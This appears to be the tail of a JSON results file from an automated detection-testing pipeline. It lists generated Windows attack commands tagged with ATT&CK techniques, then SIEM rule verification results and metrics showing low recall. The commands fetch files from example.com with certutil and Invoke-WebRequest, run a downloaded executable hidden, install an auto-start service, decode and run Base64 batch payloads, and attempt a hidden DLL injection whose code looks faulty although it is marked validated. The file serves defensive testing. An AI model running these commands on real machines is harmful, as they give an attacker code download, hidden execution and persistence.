      "command": "powershell -WindowStyle Hidden -NoProfile -Command \"$proc = Get-Process notepad; $pid = $proc.Id; $dll = 'C:\\\\Windows\\\\System32\\\\user32.dll'; $bytes = [IO.File]::ReadAllBytes($dll); $h = (Get-Process -Id $pid).Handle; $addr = [Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length); [Runtime.InteropServices.Marshal]::Copy($bytes,0,$addr,$bytes.Length); $load = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([Runtime.InteropServices.Marshal]::GetProcAddress([Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'),'LoadLibraryA'),[type]::GetType('System.Func`2[System.IntPtr,System.IntPtr]')); $load.Invoke($addr);\"",
      "description": "Performs DLL injection using only .NET Marshal methods in a hidden PowerShell window. The command reads a benign system DLL, copies it into the target notepad process memory, and invokes LoadLibraryA via a delegate to load the DLL.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The injection occurs silently; the target notepad process loads user32.dll. Because the PowerShell window is hidden, no console output is shown. Success can be confirmed by inspecting the target process's loaded modules.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:34.970120",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7a11e969-b110-4a30-b374-829a8b1f459a",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/collect?data=TestData' -Method GET -UseBasicParsing\"",
      "description": "Sends a benign test string to a remote HTTP endpoint using PowerShell's Invoke-WebRequest, demonstrating Application Layer Protocol usage.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An outbound HTTP GET request is made to http://example.com/collect with the query parameter data=TestData. No files are written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:39.212233",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cdb15ebc-a2ab-4a3f-bcf7-f126bbfaea5e",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/download?file=sample.txt' -OutFile $env:TEMP\\sample.txt -UseBasicParsing\"",
      "description": "Downloads a small text file from a remote server using HTTP, storing it in the temporary directory.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "An HTTP GET request retrieves the file 'sample.txt' and writes it to %TEMP%\\sample.txt. The file contains benign placeholder content.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:39.212233",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5a7ebc4e-82b2-4b92-9873-153a2460bcfa",
      "ttp_id": "unknown",
      "technique_id": "T1071",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/payload.bin %TEMP%\\payload.bin",
      "description": "Uses the built\u2011in certutil utility to fetch a binary over HTTP and write it to the temporary folder, illustrating Application Layer Protocol activity without PowerShell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "certutil contacts the remote server, downloads 'payload.bin' via HTTP, and saves it as %TEMP%\\payload.bin. The downloaded file is a harmless placeholder binary.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:39.212233",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3e241b6e-fd37-49ff-ba42-c620110ca0b2",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/benign.exe %TEMP%\\benign.exe",
      "description": "Download a benign executable to %TEMP% using certutil.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file benign.exe is saved to %TEMP% if the URL is reachable.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:41.809316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3ab3b3c6-cf11-40b4-b236-eeab4c3e72b4",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath \\\"%TEMP%\\\\benign.exe\\\" -WindowStyle Hidden\"",
      "description": "Execute the previously downloaded benign executable silently.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The benign.exe runs hidden without user interaction.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:41.809316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f4119a78-a7b7-4a42-b636-747f3fdfaa03",
      "ttp_id": "unknown",
      "technique_id": "T1219",
      "technique_name": "Remote Access Tool",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create M2RATService binPath= \\\"%TEMP%\\\\benign.exe\\\" start= auto && sc start M2RATService",
      "description": "Install and start a Windows service for persistence using the benign executable.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A service named M2RATService is created and started, causing the benign.exe to run with system privileges.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:41.809316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "530d362d-0479-4f13-bbe8-cc074527ecd4",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo TestCommand > %TEMP%\\test.txt\"",
      "description": "Basic command execution via cmd.exe that writes a test file to the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates %TEMP%\\test.txt containing the text 'TestCommand'.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:45.504906",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "223f8491-628c-47f1-ae2e-72c37814ec22",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path \\\"$env:TEMP\\encoded.txt\\\" -Value \\\"EncodedTest\\\" -ErrorAction SilentlyContinue\"",
      "description": "Intermediate PowerShell command that writes a benign string to a file using Set-Content.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\encoded.txt with the content 'EncodedTest'.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:45.504906",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ca5d72e5-c131-43a5-8319-479d6eb14602",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo ZWNobyBDZXJ0VXRpbFRlc3Q= > %TEMP%\\payload.b64 && certutil -decode %TEMP%\\payload.b64 %TEMP%\\payload.bat >nul && %TEMP%\\payload.bat\"",
      "description": "Advanced use of certutil to decode a Base64-encoded batch payload and execute it.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes the Base64 string to %TEMP%\\payload.bat and runs it, which echoes 'CertUtilTest' to the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:45.504906",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a5e25d8a-31da-4449-9bf7-6719381bd4c4",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -encode \"%TEMP%\\test.txt\" \"%TEMP%\\test.b64\" & certutil -decode \"%TEMP%\\test.b64\" \"%TEMP%\\decoded.txt\"",
      "description": "Encode a benign text file to Base64 using certutil and immediately decode it back, demonstrating simple obfuscation of file contents.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A Base64 file (test.b64) is created in %TEMP% and then decoded to decoded.txt, leaving the original test.txt unchanged.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:50.001518",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0cb952ef-c9e7-4314-830c-31c1eae1f4e4",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABlAHMAdAA=",
      "description": "Execute a PowerShell command via a UTF-16LE Base64 encoded string, obfuscating the actual command (writes 'test' to the console).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes the Base64 string and runs Write-Host 'test', displaying the word test in the console.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:50.001518",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1d71820e-6725-4309-a651-e82f0af70fe2",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"%TEMP%\\payload.b64\" \"%TEMP%\\payload.bat\" & cmd /c \"%TEMP%\\payload.bat\"",
      "description": "Decode a Base64\u2011encoded batch script stored in %TEMP% and immediately execute it, illustrating multi\u2011step obfuscation using native tools.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The Base64 payload is decoded to payload.bat and then run; the batch script performs a benign action (e.g., echo Obfuscated) and then exits.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:31:50.001518",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
      "attack_id": "83bdc967-fef3-4983-9894-10eaaf0b4a05",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 490.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
      "attack_id": "f721c42a-7a09-40c7-8fc1-2b1d02e02b38",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 420.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
      "attack_id": "3bcb9e12-9913-4a71-bca4-19066df0b27d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 405.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
      "attack_id": "d477b010-d225-4ab7-a1a0-f39b773e7687",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 499.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
      "attack_id": "71c1fc33-9619-4b68-a707-715e243e012e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 403.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "30472f21-100c-45ac-ae61-fd8ab894d515",
      "attack_id": "53e83274-4c20-4a5a-9ba1-986f6c6581ab",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 562.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
      "attack_id": "5b1d30e9-d26f-48ff-aea0-a2bccb0431c6",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 498.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
      "attack_id": "6e97d35e-b3d4-4f22-b060-adfcf8781b19",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 530.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
      "attack_id": "2602dd42-d1b1-487d-b20c-8ed1fbbda429",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 561.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
      "attack_id": "c448256f-4622-4228-b56b-0ad218feb1d4",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 423.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
      "attack_id": "5da834c2-9805-456c-86f2-3ce6adbe26cc",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 534.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
      "attack_id": "c28e5072-401b-4ff3-8033-5ba88aedc731",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 402.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "74011aae-bac4-425d-a3b1-f20a86e98952",
      "attack_id": "a4f439e2-b71a-483a-a896-893588e49eca",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 436.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
      "attack_id": "b97da24d-bfce-4823-999d-e1331fbdf8d3",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 505.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "05640071-2b35-4a21-af95-a1197dd77b4a",
      "attack_id": "a77bb3ff-c10a-43a1-832b-91f57548ee7a",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 435.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
      "attack_id": "a4359573-1984-4e9c-99fd-ea63c1799886",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 483.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
      "attack_id": "48dac5ca-75e5-44ee-9f0c-0474e28015ba",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 480.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e2362985-abdc-4629-afe5-24a51647c127",
      "attack_id": "278262a0-4cdc-43e7-93ce-4fb73b8a21fd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 426.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
      "attack_id": "c8fb0468-66f5-4c53-aaa9-1cc4831b7022",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 509.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "595a57b1-134d-4513-b363-298743bec018",
      "attack_id": "2c062f7b-0b06-4569-b547-ab4202b71fa3",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 632.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "703c2d55-5de9-4893-977f-696bdc567108",
      "attack_id": "631fa47c-bcb9-424d-9ffe-67c007061a01",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 571.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ca323d94-ab85-45a5-924e-016f3b318f29",
      "attack_id": "d9da5b4d-f3c3-46ca-b714-5245cc736b68",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 433.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "212f042c-98b5-4d67-8826-b2304fa736c9",
      "attack_id": "2392bf24-5534-4b5a-b5e4-f06345c5e326",
      "detected": true,
      "events_found": 2,
      "historical_events": 0,
      "query_time_ms": 525.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "5f166ada-3d3e-4ab2-a05d-029445163385",
      "attack_id": "228ea25a-3ca1-47b8-bf47-4d51e5f80d31",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 482.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a552c666-5488-4930-b586-6b6291ae5e06",
      "attack_id": "3c8a5c98-fc6c-4f5e-a616-930f24d84b4e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 488.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "9155e402-7b41-452f-8331-4967c14d7a39",
      "attack_id": "ed68c56a-8732-453a-9d04-d8226768b649",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 453.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
      "attack_id": "55a1df9b-ba14-459b-83f8-dfe877a9a948",
      "detected": true,
      "events_found": 6,
      "historical_events": 0,
      "query_time_ms": 431.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "79bbd622-9549-446b-8610-72134a8cf991",
      "attack_id": "d820280e-f5ee-42ef-ac29-1b12db501a6f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 503.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
      "attack_id": "4a10ce36-1bf6-4332-acbf-ada08ecccea9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 440.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
      "attack_id": "9ee52664-0c4a-4393-93b1-251eeaa32ea4",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 479.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
      "attack_id": "f8ae7cb2-d948-4815-ba3d-161099f23f51",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 422.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "01414447-c055-450d-a708-d96255dbdd5f",
      "attack_id": "7c3e72f3-3c5e-431a-b304-fd37509867a6",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 410.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
      "attack_id": "5d377c0e-cdb9-4b24-9a11-da0a5f5d2773",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 515.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "17a00425-c245-4124-ac67-efae97aaf5df",
      "attack_id": "0240c927-2289-41b6-8182-92b5c9781cd8",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 432.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
      "attack_id": "7560c3bf-3dc8-46a9-9ee4-1dec60248a61",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 446.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
      "attack_id": "6a1befd3-dec9-490e-aa77-9cc513f8cc2a",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 457.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
      "attack_id": "3cf5cd9b-0612-44cd-bcb6-0b1d8a30f330",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 566.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
      "attack_id": "35f94bac-8c8d-4873-903e-4ee03be1b711",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 425.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
      "attack_id": "c08b19b7-0646-4cba-8880-f6785e8656b0",
      "detected": true,
      "events_found": 8,
      "historical_events": 0,
      "query_time_ms": 591.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c76ea256-caee-4bd9-a861-e8f52792823f",
      "attack_id": "402b7e4d-5018-4191-ac6e-b5faa356e598",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 434.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
      "attack_id": "1b122ade-1427-45c9-8adf-76a6732e7e33",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 437.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
      "attack_id": "db6c3a24-cdf2-45d4-9b3b-803f4202e9c2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 435.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "cc2361d8-a083-4402-933d-928a26569b80",
      "attack_id": "75f9a1bd-1a1c-475a-8417-42bfc1b3d60c",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 431.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
      "attack_id": "68311db2-4584-40c0-bc83-d67a578bd45e",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 433.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2faeeff8-7611-482b-91ef-61a952773ba9",
      "attack_id": "5de67af1-ee09-49a1-89cc-e2c00b656371",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 429.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
      "attack_id": "3549e537-1fb2-4d0c-8a0d-9b7c79c5ecef",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 445.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
      "attack_id": "375db6a3-5293-4828-aea2-a4f448d336fb",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 433.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
      "attack_id": "b2a9d019-61b1-470d-8789-51dcdc6380dd",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 423.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "92438915-a525-4317-9f42-4caf39a5c13b",
      "attack_id": "79ffc367-b25f-4f5d-9bd6-759229a5bdaf",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 439.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
      "attack_id": "ca0a70be-79a7-40e1-bd27-051e5729eaa1",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 469.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
      "attack_id": "48cc8a24-7ad2-40c2-b670-49fc98f15493",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 455.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
      "attack_id": "032715f4-d1c1-4c90-b3ce-f5b566e0e8a7",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 429.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 4,
    "false_positives": 0,
    "false_negatives": 48,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.07692307692307693,
    "f1_score": 0.14285714285714288,
    "accuracy": 0.07692307692307693,
    "detection_rate": 0.07692307692307693,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.596,
  "timestamp": "2025-12-22T09:56:46.030981"
}